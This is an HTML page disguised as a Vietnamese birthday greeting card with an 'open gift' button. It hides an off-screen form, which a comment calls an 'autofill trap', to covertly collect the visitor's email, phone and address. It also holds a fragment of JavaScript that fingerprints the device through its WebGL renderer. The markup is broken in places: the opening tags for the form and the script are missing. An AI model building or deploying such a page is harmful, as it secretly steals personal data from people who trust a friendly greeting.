<!doctype html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Happy Birthday! 🎂</title>
<style>
    body {
        background: linear-gradient(135deg, #fbc2eb 0%, #a6c1ee 100%);
        color: #333;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        font-family: 'Comic Sans MS', cursive, sans-serif;
        margin: 0;
        padding: 20px;
        text-align: center;
        overflow: hidden;
    }
    .card {
        background: rgba(255, 255, 255, 0.9);
        border-radius: 20px;
        padding: 40px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        max-width: 400px;
        width: 100%;
        position: relative;
    }
    h1 {
        color: #ff6b81;
        font-size: 2.5em;
        margin-bottom: 10px;
    }
    p {
        font-size: 1.2em;
        color: #555;
        margin-bottom: 30px;
    }
    .cake {
        font-size: 80px;
        margin-bottom: 20px;
        animation: bounce 2s infinite;
    }
    @keyframes bounce {
        0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
        40% { transform: translateY(-20px); }
        60% { transform: translateY(-10px); }
    }
    .gift-btn {
        background: #ff6b81;
        color: white;
        border: none;
        padding: 15px 30px;
        font-size: 1.2em;
        border-radius: 50px;
        cursor: pointer;
        transition: background 0.3s, transform 0.2s;
        box-shadow: 0 5px 15px rgba(255, 107, 129, 0.4);
        font-family: inherit;
        font-weight: bold;
    }
    .gift-btn:hover {
        background: #ff4757;
        transform: scale(1.05);
    }
    .gift-btn:active {
        transform: scale(0.95);
    }
    /* Hidden elements for autofill trap */
    .honey-pot {
        position: absolute;
        left: -9999px;
        top: -9999px;
        opacity: 0;
    }
    .loader {
        display: none;
        width: 30px;
        height: 30px;
        border: 4px solid #ff6b81;
        border-top-color: transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 20px auto 0;
    }
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    #status-msg {
        display: none;
        margin-top: 15px;
        color: #ff6b81;
        font-weight: bold;
    }
</style>
</head>
<body>

<!-- Bẫy Autofill: Form tàng hình để thu thập tự động điền -->

    <input type="email" id="af-email" name="email" autocomplete="email" placeholder="Email">
    <input type="tel" id="af-phone" name="phone" autocomplete="tel" placeholder="Phone">
    <input type="text" id="af-address" name="address" autocomplete="street-address" placeholder="Address">
</form>

    <div class="cake">🎂</div>
    <h1>Happy Birthday!</h1>
    <p>Chúc bạn một ngày sinh nhật thật vui vẻ và hạnh phúc nhé!</p>

    <button class="gift-btn" id="open-gift-btn">🎁 Mở Quà Sinh Nhật 🎁</button>

    <div class="loader" id="loader"></div>
    <div id="status-msg">Đang mở hộp quà...</div>

        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
        return 'N/A';
    } catch (e) {
        return 'N/A';
    }
}
